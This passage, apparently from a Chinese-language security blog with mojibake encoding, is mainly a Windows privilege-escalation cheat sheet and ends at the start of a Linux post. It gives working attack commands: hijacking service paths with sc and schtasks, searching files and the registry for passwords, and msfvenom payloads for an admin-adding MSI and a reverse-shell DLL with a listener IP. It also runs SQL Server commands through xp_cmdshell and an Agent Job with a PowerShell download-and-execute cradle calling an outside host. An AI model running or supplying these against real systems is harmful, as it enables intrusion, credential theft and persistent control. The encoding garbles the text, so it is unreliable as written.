title="ä¸å®‰å…¨æœåŠ¡æƒé™é…åˆè®¡åˆ’ä»»åŠ¡schtasksæˆ–SCå‘½ä»¤åˆ©ç”¨"></a><strong>ä¸å®‰å…¨æœåŠ¡æƒé™é…åˆè®¡åˆ’ä»»åŠ¡schtasksæˆ–SCå‘½ä»¤åˆ©ç”¨</strong></h2><p>å¦‚æœæ”»å‡»è€…å¯¹ä»¥é«˜æƒé™è¿è¡Œçš„ä»»åŠ¡æ‰€åœ¨çš„ç›®å½•å…·æœ‰å†™æƒé™ï¼Œå°±å¯ä»¥ä½¿ç”¨è¦†ç›–åŸæ¥çš„æœåŠ¡è·¯å¾„ï¼Œè¿›è€Œå¯åŠ¨æˆ‘ä»¬çš„æ¶æ„ç¨‹åºã€‚ï¼ˆä¸€èˆ¬ç”¨æ¥administratorææƒåˆ°systemï¼Œå› ä¸ºæ™®é€šç”¨æˆ·ç”¨scä¿®æ”¹æœåŠ¡è·¯å¾„ä¼šæ²¡æœ‰æƒé™ï¼Œå¯¼è‡´ä¸èƒ½ç”¨è¯¥æ–¹æ³•ææƒã€‚ï¼‰</p><p>accesschk.exe -uwcqv â€œadministratorsâ€ * #æ£€æŸ¥administratorsç»„çš„æƒé™é…ç½®ï¼ˆè¿™é‡Œè‡ªå·±åˆ›å»ºäº†ä¸€ä¸ªtestæœåŠ¡ï¼‰</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351169-1682951443.png" alt="img"></p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351505-495496718.png" alt="img"></p><p>sc config â€œtestâ€ binpath=â€C:\shell.exeâ€ #ç”¨scå‘½ä»¤ä¿®æ”¹æœåŠ¡å¯¹åº”è·¯å¾„</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351871-824825594.png" alt="img"></p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352226-1488097995.png" alt="img"></p><p>sc start test #ç„¶åæˆ‘ä»¬åœ¨msfç›‘å¬ï¼Œåœ¨å¯åŠ¨è¯¥æœåŠ¡ï¼Œå°±å¯ä»¥æ¥æ”¶åˆ°æˆ‘ä»¬çš„shell</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352599-1121177084.png" alt="img"></p><p>å½“ç„¶è¿˜å¯ä»¥ç”¨schtasksæ¥å®šæ—¶å¯åŠ¨æœåŠ¡ï¼Œschtaskså‘½ä»¤æ¯”atå‘½ä»¤æ›´çµæ´»ã€‚è€Œä¸”åœ¨Windows Vistaã€Windows Server 2008åŠä¹‹åç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿå·²ç»å¼ƒç”¨atå‘½ä»¤ã€‚</p><p>#æŸ¥çœ‹è®¡ç®—æœºçš„è®¡åˆ’ä»»åŠ¡<br>schtasks /query /fo LIST /v</p><p>schtasks /create /s 10.10.10.80 /tn test /sc onstart /tr c:\artifact.exe /ru system /f</p><p>åœ¨è¿œç¨‹ä¸»æœºè¿è¡Œâ€testâ€ä»»åŠ¡</p><p>schtasks /run /s 10.10.10.80 /i /tn â€œtestâ€</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352923-1541900357.png" alt="img"></p><p> æ‰§è¡Œå®Œæˆä¹‹åå°±åˆ é™¤è®¡åˆ’ä»»åŠ¡</p><p>schtasks /delete /s 10.10.10.80 /tn â€œtestâ€ /f</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353205-57489983.png" alt="img"></p><p> æ¥ç€åˆ é™¤IPC$</p><p>net use \10.10.10.80 /del /y</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353471-1410299606.png" alt="img"></p><p> åœ¨ä½¿ç”¨schtaskså‘½ä»¤çš„æ—¶å€™ä¼šåœ¨ç³»ç»Ÿç•™ä¸‹æ—¥å¿—æ–‡ä»¶C:WindowsTasksSchedLgU.txtã€‚</p><p><strong>å‚æ•°çš„æ„æ€ï¼š</strong></p><p>/create è¡¨ç¤ºåˆ›å»ºè®¡åˆ’ä»»åŠ¡</p><p>/tn è¡¨ç¤ºä»»åŠ¡å</p><p>/tr æŒ‡å®šè¿è¡Œçš„æ–‡ä»¶</p><p>/sc æ˜¯ä»»åŠ¡è¿è¡Œé¢‘ç‡</p><p>/st æ˜¯æ‰§è¡Œæ—¶é—´</p><p>/s æŒ‡å®šè¿œç¨‹æœºå™¨åæˆ– ip åœ°å€</p><p>/ru æŒ‡å®šè¿è¡Œä»»åŠ¡çš„ç”¨æˆ·æƒé™ï¼Œè¿™é‡ŒæŒ‡å®šä¸ºæœ€é«˜çš„ SYSTEM</p><p>/i è¡¨ç¤ºç«‹å³è¿è¡Œ</p><p>/F è¡¨ç¤ºå¦‚æœæŒ‡å®šçš„ä»»åŠ¡å·²ç»å­˜åœ¨ï¼Œåˆ™å¼ºåˆ¶åˆ›å»ºä»»åŠ¡å¹¶æŠ‘åˆ¶è­¦å‘Š</p><p>/delete æ˜¯åˆ é™¤ä»»åŠ¡ã€‚</p><h2 id="Unattended-Installsï¼ˆè‡ªåŠ¨å®‰è£…ï¼‰"><a href="#Unattended-Installsï¼ˆè‡ªåŠ¨å®‰è£…ï¼‰" class="headerlink" title="Unattended Installsï¼ˆè‡ªåŠ¨å®‰è£…ï¼‰"></a><strong>Unattended Installsï¼ˆè‡ªåŠ¨å®‰è£…ï¼‰</strong></h2><p>è‡ªåŠ¨å®‰è£…å…è®¸ç¨‹åºåœ¨ä¸éœ€è¦ç®¡ç†å‘˜å…³æ³¨ä¸‹è‡ªåŠ¨å®‰è£…ã€‚è¿™ç§è§£å†³æ–¹æ¡ˆç”¨äºåœ¨æ‹¥æœ‰è¾ƒå¤šé›‡å‘˜å’Œæ—¶é—´ç´§ç¼ºçš„è¾ƒå¤§ å‹ç»„ç»‡ä¸­éƒ¨ç½²ç¨‹åºã€‚å¦‚æœç®¡ç†å‘˜æ²¡æœ‰è¿›è¡Œæ¸…ç†çš„è¯ï¼Œé‚£ä¹ˆä¼šæœ‰ä¸€ä¸ªåä¸ºUnattendçš„XMLæ–‡ä»¶æ®‹å­˜åœ¨ç³»ç»Ÿä¸Šã€‚ è¿™ä¸ªXMLæ–‡ä»¶åŒ…å«æ‰€æœ‰åœ¨å®‰è£…ç¨‹åºè¿‡ç¨‹ä¸­çš„é…ç½®ï¼ŒåŒ…æ‹¬ä¸€äº›æœ¬åœ°ç”¨æˆ·çš„é…ç½®ï¼Œä»¥åŠç®¡ç†å‘˜è´¦æˆ·ã€‚</p><p>å…¨ç›˜æœç´¢Unattendæ–‡ä»¶æ˜¯ä¸ªå¥½åŠæ³•ï¼Œå®ƒé€šå¸¸ä¼šåœ¨ä»¥ä¸‹ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼š</p><pre><code class="text">C:\Windows\Panther\C:\Windows\Panther\Unattend\C:\Windows\System32\C:\Windows\System32\sysprep\</code></pre><p>é™¤äº†Unattend.xmlæ–‡ä»¶å¤–ï¼Œè¿˜è¦ç•™æ„ç³»ç»Ÿä¸­çš„sysprep.xmlå’Œsysprep.infæ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ä¸­éƒ½ä¼šåŒ…å«éƒ¨ç½²æ“ä½œ ç³»ç»Ÿæ—¶ä½¿ç”¨çš„å‡­æ®ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯å¯ä»¥å¸®åŠ©æˆ‘ä»¬ææƒã€‚</p><pre><code class="text">C:\Users\user\Desktop&gt; dir C:*vnc.ini /s /b /c</code></pre><p>æˆ–è€…åœ¨åç§°ä¸­åŒ…å«å…³é”®è¯çš„é¡¹ç›®ï¼š</p><pre><code class="text">C:\Users\user\Desktop&gt; dir C:\ /s /b /c | findstr /sr *password*</code></pre><p>æˆ–è€…å¯ä»¥åœ¨æ–‡ä»¶å†…å®¹ä¸­æœç´¢passwordä¹‹ç±»çš„å…³é”®å­—ï¼š</p><pre><code class="text">C:\Users\user\Desktop&gt;findstr /si password *.txt | *.xml | *.ini</code></pre><p>å¯ä»¥æŸ¥è¯¢æ³¨å†Œè¡¨ï¼Œä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²passwordï¼š</p><pre><code class="text">reg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /s</code></pre><p>åœ¨è¿™äº›æ–‡ä»¶ä¸­é€šå¸¸åŒ…å«ç”¨æˆ·åå’Œå¯†ç ï¼Œå¯†ç ä½¿ç”¨base64ç¼–ç ï¼Œå¹¶ä¸”åœ¨æœ€åä¼šé™„åŠ â€Passwordâ€ï¼Œæ‰€ä»¥çœŸæ­£çš„å¯† ç éœ€è¦å»æ‰æœ€åçš„â€Passwordâ€ã€‚</p><p><strong>msfæ¨¡å—</strong>:</p><pre><code class="text">post/windows/gather/enum_unattend</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353799-254963719.png" alt="img"></p><h2 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a><strong>AlwaysInstallElevated</strong></h2><p>AlwaysInstallElevated æ˜¯ä¸€ç§å…è®¸éç®¡ç†ç”¨æˆ·ä»¥SYSTEMæƒé™è¿è¡ŒMicrosoft Windowså®‰è£…ç¨‹åºåŒ…ï¼ˆ.MSIæ–‡ä»¶ï¼‰çš„è®¾ç½®ã€‚é»˜è®¤æƒ…å†µä¸‹ç¦ç”¨æ­¤è®¾ç½®ï¼Œéœ€ç³»ç»Ÿç®¡ç†å‘˜æ‰‹åŠ¨å¯ç”¨ä»–ã€‚</p><p>å¯ä»¥é€šè¿‡æŸ¥è¯¢ä»¥ä¸‹æ³¨å†Œè¡¨é¡¹æ¥è¯†åˆ«æ­¤è®¾ç½®ï¼š</p><pre><code class="text">[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer] &quot;AlwaysInstallElevated&quot;=dword:00000001[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] &quot;AlwaysInstallElevated&quot;=dword:00000001</code></pre><p>ä½¿ç”¨reg queryå‘½ä»¤æŸ¥è¯¢æ˜¯å¦å­˜åœ¨æ¼æ´:</p><pre><code class="text">C:&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedorC:&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre><p>å¦‚æœç³»ç»Ÿæ²¡è¿™ä¸ªæ¼æ´ï¼Œå®ƒå°†è¾“å‡ºé”™è¯¯:</p><pre><code class="text">ERROR: The system was unable to find the specified registry key or value.</code></pre><p>å¦‚æœå­˜åœ¨æ¼æ´ï¼Œä¸Šé¢å°†è¾“å‡ºä»¥ä¸‹å†…å®¹:</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165354233-1421529420.png" alt="img"></p><p>ç„¶åæˆ‘ä»¬ä½¿ç”¨msfvenomç”Ÿæˆmsiæ–‡ä»¶ï¼Œè¿›è¡Œææƒ</p><pre><code class="text">msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o rotten.msimsiexec /quiet /qn /i C:\programdata\rotten.msi# /quiet å®‰è£…è¿‡ç¨‹ä¸­ç¦æ­¢å‘ç”¨æˆ·å‘é€æ¶ˆæ¯# /qn ä¸ä½¿ç”¨GUI# /i å®‰è£…ç¨‹åº</code></pre><p>msfä¸‹çš„è‡ªåŠ¨æ¨¡å—<br>exploit/windows/local/always_install_elevated</p><h2 id="DLLåŠ«æŒææƒ"><a href="#DLLåŠ«æŒææƒ" class="headerlink" title="DLLåŠ«æŒææƒ"></a><strong>DLLåŠ«æŒææƒ</strong></h2><p><strong>åŸç†</strong>ï¼šWindowsç¨‹åºå¯åŠ¨çš„æ—¶å€™éœ€è¦DLLã€‚å¦‚æœè¿™äº›DLL ä¸å­˜åœ¨ï¼Œåˆ™å¯ä»¥é€šè¿‡åœ¨åº”ç”¨ç¨‹åºè¦æŸ¥æ‰¾çš„ä½ç½®æ”¾ç½®æ¶æ„DLLæ¥ææƒã€‚é€šå¸¸ï¼ŒWindowsåº”ç”¨ç¨‹åºæœ‰å…¶é¢„å®šä¹‰å¥½çš„æœç´¢DLLçš„è·¯å¾„ï¼Œå®ƒä¼šæ ¹æ®ä¸‹é¢çš„é¡ºåºè¿›è¡Œæœç´¢ï¼š</p><p>1ã€åº”ç”¨ç¨‹åºåŠ è½½çš„ç›®å½•</p><p>2ã€C:\Windows\System32</p><p>3ã€C:\Windows\System</p><p>4ã€C:\Windows</p><p>5ã€å½“å‰å·¥ä½œç›®å½•Current Working Directoryï¼ŒCWD</p><p>6ã€åœ¨PATHç¯å¢ƒå˜é‡çš„ç›®å½•ï¼ˆå…ˆç³»ç»Ÿåç”¨æˆ·ï¼‰</p><p>è¿‡ç¨‹ï¼šä¿¡æ¯æ”¶é›†-è¿›ç¨‹è°ƒè¯•-åˆ¶ä½œdllå¹¶ä¸Šä¼ -æ›¿æ¢dll-å¯åŠ¨åº”ç”¨åæˆåŠŸ</p><p>msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.169.46 lport=6677 -f dll &gt;/opt/test.dll</p><h2 id="å¸¸ç”¨ç³»ç»Ÿæ¼æ´CVE"><a href="#å¸¸ç”¨ç³»ç»Ÿæ¼æ´CVE" class="headerlink" title="å¸¸ç”¨ç³»ç»Ÿæ¼æ´CVE"></a><strong>å¸¸ç”¨ç³»ç»Ÿæ¼æ´CVE</strong></h2><p>#Windows10</p><p>CVE-2020-0796 <a href="https://www.cnblogs.com/-chenxs/p/12618678.html">https://www.cnblogs.com/-chenxs/p/12618678.html</a></p><p>#Windows7/2008</p><p>CVE-2018-8120 <a href="https://www.cnblogs.com/-mo-/p/11404598.html">https://www.cnblogs.com/-mo-/p/11404598.html</a></p><p>#Windows7/8ã€2008/2012/2016</p><p>CVE-2017-0213 <a href="https://www.cnblogs.com/-mo-/p/11446144.html">https://www.cnblogs.com/-mo-/p/11446144.html</a></p><p>#SQL Serverã€IISé€šæ€ (é’ˆå¯¹æœ¬åœ°ç”¨æˆ·çš„ï¼Œä¸èƒ½ç”¨äºåŸŸç”¨æˆ·)</p><p>MS16-075(RottenPotato) <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></p><h1 id="æ•°æ®åº“ææƒ"><a href="#æ•°æ®åº“ææƒ" class="headerlink" title="æ•°æ®åº“ææƒ"></a>æ•°æ®åº“ææƒ</h1><p>å…ˆæ¥äº†è§£ä¸€ä¸‹æ€ä¹ˆæ‰èƒ½è·å–åˆ°æ•°æ®åº“çš„è´¦å·å¯†ç ï¼Ÿ<br>é…ç½®æ–‡ä»¶ä¸­ï¼Œå¦‚ï¼šconnã€configã€dataã€sqlã€common ã€incæ–‡ä»¶ä¸­<br>å®‰è£…ç›®å½•ä¸‹ï¼Œå¦‚mysqlå®‰è£…ç›®å½•ä¸‹çš„user.MYDæ–‡ä»¶<br>ä½¿ç”¨Bruterå·¥å…·ç ´è§£â€”å‰ææ˜¯å¼€å¯äº†è¿œç¨‹è¿æ¥<br>ä½¿ç”¨è„šæœ¬æ–‡ä»¶è·å–</p><p><strong>æ€ä¹ˆæ‰“å¼€è¿œç¨‹è¿æ¥ï¼Ÿ</strong><br>rootè´¦æˆ·ä¸€èˆ¬åªèƒ½æœ¬åœ°è®¿é—®ï¼Œä½†åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯èƒ½éœ€è¦æ‰“å¼€rootçš„è¿œç¨‹è®¿é—®æƒé™ã€‚<br>ç™»å½•åˆ°mysqlä¸­ï¼Œä¸ºrootè¿›è¡Œè¿œç¨‹è®¿é—®çš„æˆæƒï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š</p><pre><code>GRANT ALL PRIVILEGES ON *.* TO root@&quot;%&quot; IDENTIFIED BY &quot;root&quot;;flush privileges;</code></pre><p>ç¬¬ä¸€å¥ä¸­â€%â€è¡¨ç¤ºä»»ä½•ä¸»æœºéƒ½å¯ä»¥è¿œç¨‹ç™»å½•åˆ°è¯¥æœåŠ¡å™¨ä¸Šè®¿é—®ã€‚å¦‚æœè¦é™åˆ¶åªæœ‰æŸå°æœºå™¨å¯ä»¥è®¿é—®ï¼Œå°†å…¶æ¢æˆç›¸åº”çš„IPå³å¯<br>ç¬¬äºŒå¥è¡¨ç¤ºä»mysqlæ•°æ®åº“çš„grantè¡¨ä¸­é‡æ–°åŠ è½½æƒé™æ•°æ®ã€‚å› ä¸ºMySQLæŠŠæƒé™éƒ½æ”¾åœ¨äº†cacheä¸­ï¼Œæ‰€ä»¥åœ¨åšå®Œæ›´æ”¹åéœ€è¦é‡æ–°åŠ è½½ã€‚</p><p><strong>ææƒ</strong>:</p><h2 id="Mysqlææƒ"><a href="#Mysqlææƒ" class="headerlink" title="Mysqlææƒ"></a>Mysqlææƒ</h2><h3 id="udfææƒï¼š"><a href="#udfææƒï¼š" class="headerlink" title="udfææƒï¼š"></a>udfææƒï¼š</h3><p>é€šè¿‡åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œå¯¹mysqlåŠŸèƒ½è¿›è¡Œæ‰©å……ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿä»»æ„å‘½ä»¤ï¼Œå°†mysqlè´¦å·rootè½¬åŒ–ä¸ºç³»ç»Ÿsystemæƒé™ã€‚</p><h3 id="mofææƒï¼š"><a href="#mofææƒï¼š" class="headerlink" title="mofææƒï¼š"></a>mofææƒï¼š</h3><p>åœ¨windowså¹³å°ä¸‹ï¼Œc:/windows/system32/wbem/mof/nullevt.mof è¿™ä¸ªæ–‡ä»¶ä¼šæ¯é—´éš”ä¸€æ®µæ—¶é—´ï¼ˆå¾ˆçŸ­æš‚ï¼‰å°±ä¼šä»¥systemæƒé™æ‰§è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥ï¼Œåªè¦æˆ‘ä»¬å°†æˆ‘ä»¬å…ˆè¦åšçš„äº‹é€šè¿‡ä»£ç å­˜å‚¨åˆ°è¿™ä¸ªmofæ–‡ä»¶ä¸­ï¼Œå°±å¯ä»¥å®ç°æƒé™æå‡ã€‚<br>å¯åŠ¨é¡¹ææƒï¼šå°†åé¢è„šæœ¬ä¸Šä¼ åˆ°ç³»ç»Ÿå¯åŠ¨ç›®å½•ï¼Œå½“æœåŠ¡å™¨é‡å¯å°±ä¼šè‡ªåŠ¨æ‰§è¡Œè¯¥è„šæœ¬ï¼Œä»è€Œè·å–ç³»ç»Ÿæƒé™ã€‚</p><h2 id="SQL-Server-ææƒ"><a href="#SQL-Server-ææƒ" class="headerlink" title="SQL Server ææƒ"></a>SQL Server ææƒ</h2><p>åˆ©ç”¨SQL Serceræ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹å¼ä¹Ÿæœ‰å¤šç§ï¼Œæ¯”å¦‚xp_cmdshellã€SP_OACREATEã€æ²™ç›’ã€Agent Jobã€CLRæ¥ææƒã€‚</p><h3 id="ä½¿ç”¨xp-cmdshellè¿›è¡Œææƒï¼š"><a href="#ä½¿ç”¨xp-cmdshellè¿›è¡Œææƒï¼š" class="headerlink" title="ä½¿ç”¨xp_cmdshellè¿›è¡Œææƒï¼š"></a>ä½¿ç”¨xp_cmdshellè¿›è¡Œææƒï¼š</h3><pre><code class="text"># å¯ç”¨xp_cmdshellEXEC master..sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC master..sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;# é€šè¿‡xp_cmdshellæ‰§è¡Œç³»ç»Ÿå‘½ä»¤Exec master.dbo.xp_cmdshell &#39;whoami&#39;</code></pre><h3 id="SP-OACREATE"><a href="#SP-OACREATE" class="headerlink" title="SP_OACREATE:"></a>SP_OACREATE:</h3><pre><code class="text"># å¼€å¯ç»„ä»¶EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;RECONFIGURE WITH OVERRIDE;   EXEC sp_configure &#39;show advanced options&#39;, 0;# æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆæ— å›æ˜¾ï¼‰declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami&#39;</code></pre><h3 id="é€šè¿‡æ²™ç›’æ‰§è¡Œå‘½ä»¤"><a href="#é€šè¿‡æ²™ç›’æ‰§è¡Œå‘½ä»¤" class="headerlink" title="é€šè¿‡æ²™ç›’æ‰§è¡Œå‘½ä»¤"></a>é€šè¿‡æ²™ç›’æ‰§è¡Œå‘½ä»¤</h3><pre><code class="text"># å¼€å¯æ²™ç›’exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,1# åˆ©ç”¨jet.oledbæ‰§è¡Œå‘½ä»¤select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;database=c:\windows\system32\ias\dnary.mdb&#39;,&#39;select shell(&quot;whoami&quot;)&#39;)</code></pre><h3 id="é€šè¿‡Agent-Jobæ‰§è¡Œå‘½ä»¤"><a href="#é€šè¿‡Agent-Jobæ‰§è¡Œå‘½ä»¤" class="headerlink" title="é€šè¿‡Agent Jobæ‰§è¡Œå‘½ä»¤"></a>é€šè¿‡Agent Jobæ‰§è¡Œå‘½ä»¤</h3><p>ä¿®æ”¹å¼€å¯Ageent Jobï¼Œæ‰§è¡Œæ— å›æ˜¾CobaltStrikeç”Ÿæˆpowershellä¸Šçº¿</p><pre><code class="text">USE msdb; EXEC dbo.sp_add_job @job_name = N&#39;test_powershell_job1&#39; ; EXEC sp_add_jobstep @job_name = N&#39;test_powershell_job1&#39;, @step_name = N&#39;test_powershell_name1&#39;, @subsystem = N&#39;PowerShell&#39;, @command = N&#39;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://192.168.214.129:80/a&#39;&#39;))&quot;&#39;, @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N&#39;test_powershell_job1&#39;; EXEC dbo.sp_start_job N&#39;test_powershell_job1&#39;;</code></pre><p>æ•´ä½“æ€è·¯<br>1.é€šè¿‡å„ç§æ¼æ´æ‹¿åˆ°shell<br>2.æ‰¾ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼ˆæ‰¾è´¦å·ã€å¯†ç ï¼‰<br>3.ä½¿ç”¨ å·¥å…· ææƒ</p><p>æ•°æ®åº“é˜²å¾¡<br>1ã€é™æ­¢æ•°æ®åº“è¿œç¨‹è¿æ¥ï¼Œç»™æ•°æ®åº“å¸æˆ·è®¾ç½®å¯†ç å¿…é¡»&gt;8ä½ä»¥ä¸Šå¹¶æ•°å­—+å­—æ¯+ç‰¹æ®Šç¬¦å·ç­‰ã€‚<br>2ã€ä¸è¦ç»™ç½‘ç«™é…ç½®rootæˆ–SAæƒé™ã€‚å¿…é¡»ç»™æ¯ä¸ªç½‘ç«™ç‹¬ç«‹åˆ†é…æ•°æ®åº“å¸æˆ·å¹¶é™æ ¼æ§åˆ¶å¥½æƒé™ã€‚<br>3ã€åŠæ—¶å‡çº§æ•°æ®åº“è¡¥ä¸ã€‚<br>4ã€å®‰è£…Wafè¿›è¡Œé˜²å¾¡ã€‚<br>5ã€è´­ä¹°æ•°æ®åº“å®¡è®¡è®¾å¤‡ã€‚</p><p><strong>åŸºæœ¬è½¬è‡ªéšé£å¸ˆå‚…ï¼Œåšäº†ç‚¹å°å°æ”¹åŠ¨ï¼Œå› ä¸ºè‡ªå·±å¤ªèœäº†å†™ä¸å‡ºæ¥è¿™ä¹ˆå¥½çš„æ–‡ç« ï¼Œéšé£å¸ˆå‚…tql:<a href="https://www.cnblogs.com/sfsec/p/15162635.html">https://www.cnblogs.com/sfsec/p/15162635.html</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
          <category> windowsææƒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxææƒæ€»ç»“</title>
      <link href="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
      <url>/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸ºä»€ä¹ˆè¦ææƒ"><a href="#ä¸ºä»€ä¹ˆè¦ææƒ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦ææƒ?"></a>ä¸ºä»€ä¹ˆè¦ææƒ?</h1><p>å½“æˆåŠŸé€šè¿‡80æˆ–è€…443ç«¯å£é€šè¿‡webæœåŠ¡æ¸—é€æ—¶ï¼Œå¸¸å¸¸æ˜¯www-data ã€‚æ— æ³•æ‰§è¡Œroot æƒé™ä¸‹çš„ä¸€ä¸‹å‘½ä»¤æˆ–è€…è¯»å–/root  ä¸‹çš„é‡è¦æ–‡ä»¶ã€‚è¿™ä¸ªæ—¶å€™å°±éœ€è¦ææƒï¼Œåœ¨root  æƒé™ä¸‹ï¼Œè¿˜å¯ä»¥é€šè¿‡msfvenomç”Ÿæˆå…¶ä»–åé—¨æ–‡ä»¶æˆ–è€…ä¸€äº›éšè—åé—¨ã€‚æ·»åŠ ç”¨æˆ·ï¼Œå¼€å¯å…¶ä»–ç«¯å£ç­‰æ“ä½œï¼Œè¾¾åˆ°æƒé™æŒç»­æ§åˆ¶ã€‚</p><h1 id="ä»€ä¹ˆæ˜¯æƒé™"><a href="#ä»€ä¹ˆæ˜¯æƒé™" class="headerlink" title="ä»€ä¹ˆæ˜¯æƒé™"></a>ä»€ä¹ˆæ˜¯æƒé™</h1><p>åœ¨Linux ç³»ç»Ÿä¸­ï¼Œ<code>ls -al</code> å³å¯æŸ¥çœ‹åˆ—å‡ºæ–‡ä»¶æ‰€å±çš„æƒé™ã€‚</p><p><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220311164240865.png" alt="image-20220311164240865"></p><p>åˆ†æ:</p><pre><code class="php">-rw-r--r--.  1 root root   176 5æœˆ  18 2020 .bash_profile</code></pre><p><strong>ç¬¬ä¸€ç»„æ•°æ®</strong></p><pre><code class="php">-rw-r--r--</code></pre><p>ç¬¬ä¸€ä½ï¼š</p><p><code>-</code> : ä»£è¡¨æ™®é€šæ–‡ä»¶</p><p><code>d</code>ï¼šä»£è¡¨ç›®å½•</p><p><code>l</code>ï¼šä»£è¡¨è½¯é“¾æ¥</p><p><code>b</code>ï¼šä»£è¡¨å—æ–‡ä»¶</p><p><code>c</code>ï¼šä»£è¡¨å­—ç¬¦è®¾å¤‡</p><p>ç¬¬äºŒåŠåé¢å‡ ä½,åˆ†åˆ«ä¸‰ä¸ªä¸ºä¸€ç»„ï¼š</p><pre><code class="php">rw-r--r--  ä»£è¡¨æ–‡ä»¶æ‰€å±çš„æƒé™</code></pre><p>r : æ–‡ä»¶å¯è¯»ã€‚w : æ–‡ä»¶å¯ä¿®æ”¹ã€‚- : è¡¨ç¤ºæš‚æ—¶æ²¡æœ‰å…¶ä»–æƒé™ã€‚x : è¡¨ç¤ºå¯æ‰§è¡Œ</p><p>ç¬¬ä¸€ä¸ª<code>rw-</code> è¡¨ç¤ºæ–‡ä»¶æ‰€æ‹¥æœ‰è€…çš„æƒé™ã€‚</p><p>ç¬¬äºŒä¸ª<code>r--</code> è¡¨ç¤ºæ–‡ä»¶æ‰€åœ¨ç»„çš„ç”¨æˆ·çš„æƒé™ã€‚</p><p>ç¬¬ä¸‰ä¸ª<code>r--</code>  è¡¨ç¤ºå…¶ä»–ç»„çš„ç”¨æˆ·çš„æƒé™ã€‚</p><p><strong>ç¬¬äºŒç»„æ•°æ®</strong></p><pre><code>1</code></pre><ul><li>å¦‚æœæ–‡ä»¶ç±»å‹ä¸ºç›®å½•ï¼Œè¡¨ç¤ºç›®å½•ä¸‹çš„å­—ç›®å½•ä¸ªæ•°</li><li>å¦‚æœæ–‡ä»¶ç±»å‹æ˜¯æ™®é€šæ–‡ä»¶ï¼Œè¿™ä¸ªæ•°æ®å°±è¡¨ç¤ºè¿™ä¸ªæ–‡ä»¶çš„ç¡¬é“¾æ¥ä¸ªæ•°</li></ul><p><strong>ç¬¬ä¸‰ç»„æ•°æ®</strong></p><pre><code>root</code></pre><p>è¡¨ç¤ºè¯¥æ–‡ä»¶æ‰€æœ‰è€…ä¸ºroot ç”¨æˆ·</p><p><strong>ç¬¬å››ç»„æ•°æ®</strong></p><pre><code>root</code></pre><p>è¡¨ç¤ºè¯¥æ–‡ä»¶æ‰€åœ¨ç»„ä¸ºroot 